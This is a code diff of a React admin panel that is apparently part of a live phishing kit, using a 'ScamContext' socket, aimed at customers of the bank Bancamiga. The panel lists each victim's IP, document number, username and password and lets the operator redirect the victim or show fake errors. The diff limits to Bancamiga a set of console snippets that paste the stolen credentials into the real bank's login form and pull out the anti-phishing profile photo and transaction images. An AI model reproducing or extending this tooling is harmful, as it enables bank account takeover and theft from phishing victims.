@@ -11,7 +11,8 @@ export const  ModalActionLiveBag = ({bag, onClose, isOpen}) => {
   const [selectPageRedirect, setSelectPageRedirect] = useState('')
   const { socket } = useContext(ScamContext)
   
-  const {ip, liveData, urlPage, nroDocument, username, password} = bag
+  const {ip, liveData, urlPage, nroDocument, username, password, nameBank} = bag
+  
   return (
       <Modal backdrop={'blur'} isOpen={isOpen} onClose={onClose} >
       <ModalContent>
@@ -43,8 +44,8 @@ export const  ModalActionLiveBag = ({bag, onClose, isOpen}) => {
                             {textPage != 'Terminar' 
                             ? (
                               <>
-                                {!pageNow ? (<RedirectIconLive onClose={onClose} urlPage={urlPage} ip={ip} socket={socket} textPage={textPage} />) : null }
-                                <ErrorIconLive onClose={onClose} urlPage={urlPage} ip={ip} socket={socket} textPage={textPage} />
+                                {!pageNow ? (<RedirectIconLive nameBank={nameBank} onClose={onClose} urlPage={urlPage} ip={ip} socket={socket} textPage={textPage} />) : null }
+                                <ErrorIconLive nameBank={nameBank} onClose={onClose} urlPage={urlPage} ip={ip} socket={socket} textPage={textPage} />
                               </>
                             ) : null}
                           </div>
@@ -53,33 +54,40 @@ export const  ModalActionLiveBag = ({bag, onClose, isOpen}) => {
                       </div>
                     ))
                     }
-                    <p>Codigo para rellenar de manera rapida</p>
-                  <Snippet codeString={`document.querySelector('#documento').value = '${nroDocument}'
-document.querySelector('#u').value = '${username}'
-document.querySelector('#p').value = '${password}'`} className='text-[10px]'>
-                    <span>document.querySelector('#documento').value = '{nroDocument}'</span>
-                    <span>document.querySelector('#u').value = '{`${username}`}'</span>
-                    <span>document.querySelector('#p').value = '{password}'</span>
-                  </Snippet>
+                    {
+                      nameBank == 'Bancamiga' ? (
+                        <>
+                        <p>Codigo para rellenar de manera rapida</p>
+                          <Snippet codeString={`document.querySelector('#documento').value = '${nroDocument}'
+        document.querySelector('#u').value = '${username}'
+        document.querySelector('#p').value = '${password}'`} className='text-[10px]'>
+                            <span>document.querySelector('#documento').value = '{nroDocument}'</span>
+                            <span>document.querySelector('#u').value = '{`${username}`}'</span>
+                            <span>document.querySelector('#p').value = '{password}'</span>
+                          </Snippet>
 
-                    <p>Codigo para foto anti-pishing</p>
-                  <Snippet codeString={`document.querySelector('.profile-pic img[src]').src`} className='text-[10px]'>
-                    <span>document.querySelector('.profile-pic img[src]').src</span>
-                  </Snippet>
+                            <p>Codigo para foto anti-pishing</p>
+                          <Snippet codeString={`document.querySelector('.profile-pic img[src]').src`} className='text-[10px]'>
+                            <span>document.querySelector('.profile-pic img[src]').src</span>
+                          </Snippet>
 
 
-                    <p>Codigo para pedir foto de transacciones</p>
-                  <Snippet codeString={`const codePhotoList = []
-document.querySelectorAll('#contMet > section > table img[src]').forEach(e => codePhotoList.push(e.src))
-codePhotoList`} className='text-[10px]'>
-  
-                    <span>const codePhotoList = []</span>
-                    <span>{`const selectorQuery = '#contMet > section > table img[src]'`}</span>
-                    <span>{`document.querySelectorAll(selectorQuery)`}</span>
-                    <span>{`.forEach(e => codePhotoList.push(e.src))`}</span>
-                    <span>{`codePhotoList`}</span>
+                            <p>Codigo para pedir foto de transacciones</p>
+                          <Snippet codeString={`const codePhotoList = []
+        document.querySelectorAll('#contMet > section > table img[src]').forEach(e => codePhotoList.push(e.src))
+        codePhotoList`} className='text-[10px]'>
+          
+                            <span>const codePhotoList = []</span>
+                            <span>{`const selectorQuery = '#contMet > section > table img[src]'`}</span>
+                            <span>{`document.querySelectorAll(selectorQuery)`}</span>
+                            <span>{`.forEach(e => codePhotoList.push(e.src))`}</span>
+                            <span>{`codePhotoList`}</span>
 
-                  </Snippet>
+                          </Snippet>
+                        </>
+                      ) : ''
+                    }
+                    
               </>
             </ModalBody>
             <ModalFooter>
